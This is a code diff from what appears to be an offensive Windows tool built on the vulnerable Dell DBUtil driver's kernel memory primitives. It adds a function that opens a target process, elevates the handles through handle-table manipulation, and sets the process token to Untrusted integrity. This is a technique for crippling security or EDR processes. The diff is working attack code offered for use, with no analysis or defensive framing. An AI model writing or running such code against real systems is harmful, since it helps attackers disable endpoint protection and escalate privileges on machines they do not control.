@@ -188,6 +188,46 @@ DWORD64 RetriveTokenAdress(CLIENT_ID procid) {
 	return  LookupEprocessByPid(systemEprocessAddr, procid) + Offsets.Token;
 }
 
+void SetProcessIL_toUntrustedSandbox(int pid) {
+    NTSTATUS r;
+    CLIENT_ID id;
+    std::cout << "[#]Got PID: " << pid << " to Terminate" << std::endl;
+ 
+    id.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
+    id.UniqueThread = (PVOID)0;
+    OBJECT_ATTRIBUTES oa;
+    HANDLE handle = 0;
+    InitObjAttr(&oa, NULL, NULL, NULL, NULL);
+    std::cout << "[#]Openeing PROCESS_QUERY_LIMITED_INFORMATION handle to: " << pid << std::endl;
+    NTSTATUS Op = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
+ 
+    std::cout << "[#]NtOpenProcess Status: " << std::hex << Op << std::endl;
+    if (handle == INVALID_HANDLE_VALUE) {
+        std::cout << "[#]Unable to obtain a handle to process " << std::endl;
+        ExitProcess(0);
+    }
+ 
+    ElevateHandle(ourHandleTable, (ULONGLONG)handle);
+    HANDLE hToken;
+    OpenProcessToken(handle, TOKEN_QUERY, &hToken);
+ 
+    ElevateHandle(ourHandleTable, (ULONGLONG)hToken);
+    ULONG cbSid = GetSidLengthRequired(1);
+ 
+    TOKEN_MANDATORY_LABEL tml = { { alloca(cbSid)} };
+ 
+    ULONG dwError = NOERROR;
+ 
+    if (!CreateWellKnownSid(WinUntrustedLabelSid, 0, tml.Label.Sid, &cbSid) ||
+        !SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(tml)))
+    {
+        dwError = GetLastError();
+    }
+ 
+    CloseHandle(hToken);
+ 
+ 
+}
 
 VOID WriteBySize(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
 	struct DBUTIL23_MEMORY_WRITE* WriteBuff = (DBUTIL23_MEMORY_WRITE*)calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
